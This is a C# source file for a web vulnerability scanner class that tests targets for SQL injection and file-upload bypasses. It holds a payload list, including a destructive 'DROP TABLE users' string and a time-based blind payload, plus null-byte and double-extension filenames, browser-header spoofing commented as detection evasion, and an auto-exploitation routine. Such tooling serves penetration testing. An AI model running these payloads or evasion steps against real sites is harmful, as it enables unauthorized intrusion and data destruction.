using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;
using System.Threading.Tasks;
using System.Linq;

namespace ShadowStrike.Core
{
    public class InjectionTester
    {
        private HttpClient _client;
        private Random _random;
        private string[] _userAgents;
        private BrowserInjectionTester? _browserTester;
        
        public bool UseBrowserMode { get; set; } = false;
        
        public InjectionTester()
        {
            // Use HttpClientHandler for cookie and redirect handling
            var handler = new HttpClientHandler
            {
                UseCookies = true,
                AllowAutoRedirect = true,
                AutomaticDecompression = System.Net.DecompressionMethods.GZip | System.Net.DecompressionMethods.Deflate
            };
            
            _client = new HttpClient(handler);
            _client.Timeout = TimeSpan.FromSeconds(30);
            _random = new Random();
            
            // Legitimate User-Agent strings to evade detection
            _userAgents = new[]
            {
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            };
        }

        private async Task<HttpResponseMessage> SendWithMaximumEvasion(HttpRequestMessage request)
        {
            // First, visit the homepage to get cookies and appear legitimate
            try
            {
                var homeRequest = new HttpRequestMessage(HttpMethod.Get, $"{request.RequestUri.Scheme}://{request.RequestUri.Host}/");
                SetEvasiveHeaders(homeRequest);
                await _client.SendAsync(homeRequest);
                await Task.Delay(_random.Next(500, 1500)); // Human-like delay
            }
            catch { }

            SetEvasiveHeaders(request);
            return await _client.SendAsync(request);
        }

        private void SetEvasiveHeaders(HttpRequestMessage request)
        {
            request.Headers.UserAgent.ParseAdd(_userAgents[_random.Next(_userAgents.Length)]);
            request.Headers.Accept.ParseAdd("text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7");
            request.Headers.AcceptLanguage.ParseAdd("en-US,en;q=0.9");
            request.Headers.AcceptEncoding.ParseAdd("gzip, deflate, br");
            request.Headers.Add("Sec-Ch-Ua", "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"");
            request.Headers.Add("Sec-Ch-Ua-Mobile", "?0");
            request.Headers.Add("Sec-Ch-Ua-Platform", "\"Windows\"");
            request.Headers.Add("Sec-Fetch-Dest", "document");
            request.Headers.Add("Sec-Fetch-Mode", "navigate");
            request.Headers.Add("Sec-Fetch-Site", "none");
            request.Headers.Add("Sec-Fetch-User", "?1");
            request.Headers.Add("Upgrade-Insecure-Requests", "1");
            request.Headers.CacheControl = new System.Net.Http.Headers.CacheControlHeaderValue { MaxAge = TimeSpan.Zero };
        }

        public class FileUploadTest
        {
            public string TestName { get; set; }
            public string Description { get; set; }
            public bool Vulnerable { get; set; }
            public string Details { get; set; }
        }

        public async Task<List<FileUploadTest>> TestFileUploadAsync(string url, string filePath)
        {
            // If Browser Mode is enabled, divert to browser tester
            if (UseBrowserMode)
            {
                return await TestFileUploadWithBrowserAsync(url, filePath);
            }

            var results = new List<FileUploadTest>();
            
            try
            {
                if (!File.Exists(filePath))
                {
                    results.Add(new FileUploadTest 
                    { 
                        TestName = "File Check", 
                        Description = "Checking if file exists", 
                        Vulnerable = false, 
                        Details = "File not found" 
                    });
                    return results;
                }

                var fileName = Path.GetFileName(filePath);
                var fileBytes = File.ReadAllBytes(filePath);

                // Test 1: Standard Upload
                try
                {
                    var content = new MultipartFormDataContent();
                    var fileContent = new ByteArrayContent(fileBytes);
                    
                    // Try to guess content type
                    string contentType = "application/octet-stream";
                    if (fileName.EndsWith(".jpg") || fileName.EndsWith(".jpeg")) contentType = "image/jpeg";
                    else if (fileName.EndsWith(".png")) contentType = "image/png";
                    else if (fileName.EndsWith(".php")) contentType = "application/x-php";
                    
                    fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue(contentType);
                    
                    // Guess the form field name - usually 'file', 'upload', 'image', etc.
                    string fileFormKey = "file"; // Default
                    
                    content.Add(fileContent, fileFormKey, fileName);
                    
                    var response = await _client.PostAsync(url, content);
                    var responseContent = await response.Content.ReadAsStringAsync();

                    bool vulnerable = response.IsSuccessStatusCode;
                    string uploadedUrl = ExtractUploadedFileUrl(responseContent, url, fileName);
                    
                    string details = $"Status: {response.StatusCode}\n";
                    if (vulnerable)
                    {
                        details += $"✅ FILE UPLOADED SUCCESSFULLY!\n";
                        if (!string.IsNullOrEmpty(uploadedUrl))
                        {
                            details += $"📁 File URL: {uploadedUrl}\n";
                        }
                        details += $"Response: {responseContent.Substring(0, Math.Min(responseContent.Length, 300))}";
                    }
                    else
                    {
                        details += $"❌ Upload rejected by server\n";
                        details += $"Response: {responseContent.Substring(0, Math.Min(responseContent.Length, 200))}";
                    }

                    results.Add(new FileUploadTest
                    {
                        TestName = "Standard File Upload",
                        Description = "Attempting to upload file normally",
                        Vulnerable = vulnerable,
                        Details = details
                    });
                }
                catch (Exception ex)
                {
                    results.Add(new FileUploadTest
                    {
                        TestName = "Standard File Upload",
                        Description = "Attempting to upload file normally",
                        Vulnerable = false,
                        Details = $"Test failed: {ex.Message}\n\nMake sure the URL is a valid upload endpoint (e.g., /api/upload)"
                    });
                }

                // Test 2: Double Extension Bypass
                try
                {
                    var doubleExtFilename = fileName + ".jpg";
                    var content = new MultipartFormDataContent();
                    var fileContent = new ByteArrayContent(fileBytes);
                    
                    fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("image/jpeg");
                    
                    // Guess the form field name
                    string fileFormKey = "file"; 
                    
                    content.Add(fileContent, fileFormKey, doubleExtFilename);
                    
                    var response = await _client.PostAsync(url, content);
                    var responseContent = await response.Content.ReadAsStringAsync();

                    bool vulnerable = response.IsSuccessStatusCode;
                    string uploadedUrl = ExtractUploadedFileUrl(responseContent, url, doubleExtFilename);
                    
                    string details = $"Status: {response.StatusCode}\n";
                    if (vulnerable)
                    {
                        details += $"✅ FILE UPLOADED SUCCESSFULLY!\n";
                        details += $"Uploaded as: {doubleExtFilename}\n";
                        if (!string.IsNullOrEmpty(uploadedUrl))
                        {
                            details += $"📁 File URL: {uploadedUrl}\n";
                        }
                        details += $"Response: {responseContent.Substring(0, Math.Min(responseContent.Length, 300))}";
                    }
                    else
                    {
                        details += $"❌ Upload rejected by server\n";
                        details += $"Response: {responseContent.Substring(0, Math.Min(responseContent.Length, 200))}";
                    }

                    results.Add(new FileUploadTest
                    {
                        TestName = "Double Extension (.php.jpg)",
                        Description = "Testing if server accepts files with double extensions",
                        Vulnerable = vulnerable,
                        Details = details
                    });
                }
                catch (Exception ex)
                {
                    results.Add(new FileUploadTest
                    {
                        TestName = "Double Extension (.php.jpg)",
                        Description = "Testing if server accepts files with double extensions",
                        Vulnerable = false,
                        Details = $"❌ Test failed: {ex.Message}\n\nMake sure the URL is a valid upload endpoint (e.g., /api/upload)"
                    });
                }

                // Test 3: Null Byte Injection
                try
                {
                    var nullByteFilename = Path.GetFileNameWithoutExtension(fileName) + ".php%00.jpg";
                    var content = new MultipartFormDataContent();
                    var fileContent = new ByteArrayContent(fileBytes);
                    
                    fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("image/jpeg");
                    
                    // Guess the form field name
                    string fileFormKey = "file"; 
                    
                    content.Add(fileContent, fileFormKey, nullByteFilename);
                    
                    var response = await _client.PostAsync(url, content);
                    var responseContent = await response.Content.ReadAsStringAsync();

                    bool vulnerable = response.IsSuccessStatusCode;
                    string uploadedUrl = ExtractUploadedFileUrl(responseContent, url, nullByteFilename);
                    
                    string details = $"Status: {response.StatusCode}\n";
                    if (vulnerable)
                    {
                        details += $"✅ FILE UPLOADED SUCCESSFULLY!\n";
                        details += $"Uploaded as: {nullByteFilename}\n";
                        if (!string.IsNullOrEmpty(uploadedUrl))
                        {
                            details += $"📁 File URL: {uploadedUrl}\n";
                        }
                        details += $"Response: {responseContent.Substring(0, Math.Min(responseContent.Length, 300))}";
                    }
                    else
                    {
                        details += $"❌ Upload rejected by server\n";
                        details += $"Response: {responseContent.Substring(0, Math.Min(responseContent.Length, 200))}";
                    }

                    results.Add(new FileUploadTest
                    {
                        TestName = "Null Byte Injection (.php%00.jpg)",
                        Description = "Testing if server is vulnerable to null byte injection",
                        Vulnerable = vulnerable,
                        Details = details
                    });
                }
                catch (Exception ex)
                {
                    results.Add(new FileUploadTest
                    {
                        TestName = "Null Byte Injection (.php%00.jpg)",
                        Description = "Testing if server is vulnerable to null byte injection",
                        Vulnerable = false,
                        Details = $"Test failed: {ex.Message}"
                    });
                }
            }
            catch (Exception ex)
            {
                results.Add(new FileUploadTest
                {
                    TestName = "File Upload Test",
                    Description = "Critical error during file upload testing",
                    Vulnerable = false,
                    Details = $"Critical error: {ex.Message}. Check file path and URL."
                });
            }

            return results;
        }

        private string ExtractUploadedFileUrl(string responseContent, string baseUrl, string filename)
        {
            try
            {
                // Try to extract file URL from common response patterns
                var patterns = new[]
                {
                    @"""url""\s*:\s*""([^""]+)""",           // JSON: "url": "..."
                    @"""path""\s*:\s*""([^""]+)""",          // JSON: "path": "..."
                    @"""file""\s*:\s*""([^""]+)""",          // JSON: "file": "..."
                    @"""location""\s*:\s*""([^""]+)""",      // JSON: "location": "..."
                    @"href=""([^""]*" + filename + @")""",   // HTML: href="...filename"
                    @"src=""([^""]*" + filename + @")""",    // HTML: src="...filename"
                };

                foreach (var pattern in patterns)
                {
                    var match = System.Text.RegularExpressions.Regex.Match(responseContent, pattern, 
                        System.Text.RegularExpressions.RegexOptions.IgnoreCase);
                    if (match.Success)
                    {
                        var url = match.Groups[1].Value;
                        // Make absolute URL if relative
                        if (!url.StartsWith("http"))
                        {
                            var uri = new Uri(baseUrl);
                            url = $"{uri.Scheme}://{uri.Host}{(url.StartsWith("/") ? "" : "/")}{url}";
                        }
                        return url;
                    }
                }

                // If no pattern matched, try to construct likely URL
                var baseUri = new Uri(baseUrl);
                return $"{baseUri.Scheme}://{baseUri.Host}/uploads/{filename}";
            }
            catch
            {
                return "";
            }
        }

        // SQL Injection testing
        public class SqlInjectionTest
        {
            public string TestName { get; set; }
            public string Payload { get; set; }
            public bool Vulnerable { get; set; }
            public string Response { get; set; }
            public string Severity { get; set; }
        }

        public async Task<List<SqlInjectionTest>> TestSqlInjectionAsync(string url, string parameter)
        {
            var results = new List<SqlInjectionTest>();
            var payloads = GetSqlInjectionPayloads();
            var timeBasedTestName = "Time-Based Blind (5 sec delay)";

            foreach (var payload in payloads)
            {
                try
                {
                    bool isTimeBasedTest = payload.Key == timeBasedTestName;
                    
                    var testUrl = $"{url}?{parameter}={Uri.EscapeDataString(payload.Value)}";
                    
                    // Start timer immediately before the request
                    var startTime = DateTime.Now; 
                    
                    var response = await _client.GetAsync(testUrl);
                    
                    // Stop timer immediately after the response
                    var totalTime = DateTime.Now - startTime; 
                    
                    var content = await response.Content.ReadAsStringAsync();

                    bool isVulnerable = false;
                    string severity = "NONE";

                    if (isTimeBasedTest)
                    {
                        // Check if the response time significantly exceeds the SLEEP duration (5 seconds)
                        if (totalTime.TotalSeconds >= 5) 
                        {
                            isVulnerable = true;
                            severity = "CRITICAL (Time-Based)";
                        }
                    }
                    else
                    {
                        // Use original error-based detection
                        isVulnerable = DetectSqlInjectionVulnerability(content, payload.Key);
                        severity = isVulnerable ? "HIGH (Error-Based)" : "NONE";
                    }

                    results.Add(new SqlInjectionTest
                    {
                        TestName = payload.Key + (isTimeBasedTest ? $" (Took {totalTime.TotalSeconds:F2}s)" : ""),
                        Payload = payload.Value,
                        Vulnerable = isVulnerable,
                        Response = content.Length > 200 ? content.Substring(0, 200) + "..." : content,
                        Severity = severity
                    });
                }
                catch (Exception ex)
                {
                    results.Add(new SqlInjectionTest
                    {
                        TestName = payload.Key,
                        Payload = payload.Value,
                        Vulnerable = false,
                        Response = $"Error: {ex.Message}. Make sure URL includes the endpoint (e.g., /api/search)",
                        Severity = "ERROR"
                    });
                }
            }

            return results;
        }

        private Dictionary<string, string> GetSqlInjectionPayloads()
        {
            return new Dictionary<string, string>
            {
                { "Single Quote Test", "'" },
                { "Double Quote Test", "\"" },
                { "SQL Comment", "' --" },
                { "OR 1=1", "' OR '1'='1" },
                { "UNION SELECT", "' UNION SELECT NULL--" },
                { "Time-Based Blind (5 sec delay)", "' AND (SELECT 5 * FROM (SELECT(SLEEP(5)))a)--" }, // Using MySQL format
                { "Boolean Blind", "' AND 1=1--" },
                { "Stacked Queries", "'; DROP TABLE users--" }
            };
        }

        private bool DetectSqlInjectionVulnerability(string response, string testType)
        {
            // Simple detection based on error messages
            var errorSignatures = new[]
            {
                "sql syntax",
                "mysql_fetch",
                "syntax error",
                "postgresql error",
                "ora-",
                "microsoft sql server",
                "unclosed quotation mark"
            };

            var lowerResponse = response.ToLower();
            return errorSignatures.Any(sig => lowerResponse.Contains(sig));
        }

        private async Task<List<FileUploadTest>> TestFileUploadWithBrowserAsync(string url, string filePath)
        {
            try
            {
                // Initialize browser if not already done
                if (_browserTester == null)
                {
                    _browserTester = new BrowserInjectionTester();
                    var initialized = await _browserTester.InitializeBrowserAsync();
                    
                    if (!initialized)
                    {
                        return new List<FileUploadTest>
                        {
                            new FileUploadTest
                            {
                                TestName = "Browser Mode",
                                Description = "Failed to initialize Chrome browser",
                                Vulnerable = false,
                                Details = "❌ Chrome browser not found or failed to start.\n\nMake sure Chrome is installed on your system.\nDownload from: https://www.google.com/chrome/"
                            }
                        };
                    }
                }

                // Run browser-based tests
                var browserResults = await _browserTester.TestFileUploadWithBrowserAsync(url, filePath);
                
                // Convert browser results to FileUploadTest format
                return browserResults.Select(br => new FileUploadTest
                {
                    TestName = br.TestName,
                    Description = br.Description,
                    Vulnerable = br.Vulnerable,
                    Details = br.Details
                }).ToList();
            }
            catch (Exception ex)
            {
                return new List<FileUploadTest>
                {
                    new FileUploadTest
                    {
                        TestName = "Browser Mode Error",
                        Description = "Browser automation failed",
                        Vulnerable = false,
                        Details = $"❌ Error: {ex.Message}\n\nTry HTTP mode instead or check Chrome installation."
                    }
                };
            }
        }

        public async Task<List<FileUploadTest>> AutoDiscoverAndExploitAsync(string url)
        {
            try
            {
                // Initialize browser if not already done
                if (_browserTester == null)
                {
                    _browserTester = new BrowserInjectionTester();
                    var initialized = await _browserTester.InitializeBrowserAsync();
                    
                    if (!initialized)
                    {
                        return new List<FileUploadTest>
                        {
                            new FileUploadTest
                            {
                                TestName = "Browser Initialization",
                                Description = "Failed to initialize Chrome browser",
                                Vulnerable = false,
                                Details = "❌ Chrome browser not found or failed to start.\n\nMake sure Chrome is installed on your system."
                            }
                        };
                    }
                }

                // Run auto-discovery
                var browserResults = await _browserTester.AutoDiscoverAndExploitAsync(url);
                
                // Convert results
                return browserResults.Select(r => new FileUploadTest
                {
                    TestName = r.TestName,
                    Description = r.Description,
                    Vulnerable = r.Vulnerable,
                    Details = r.Details
                }).ToList();
            }
            catch (Exception ex)
            {
                return new List<FileUploadTest>
                {
                    new FileUploadTest
                    {
                        TestName = "Auto Exploitation Error",
                        Description = "Failed to execute automated exploitation",
                        Vulnerable = false,
                        Details = $"Error: {ex.Message}"
                    }
                };
            }
        }

        public string GetMitigationGuidance(string vulnerabilityType)
        {
            return vulnerabilityType switch
            {
                "SQLi" => "Use parameterized queries/prepared statements. Never concatenate user input into SQL queries.",
                "File Upload" => "Validate file types server-side using magic bytes. Store uploads outside web root. Use whitelist for extensions.",
                _ => "Follow OWASP security guidelines for web application security."
            };
        }
    }
}
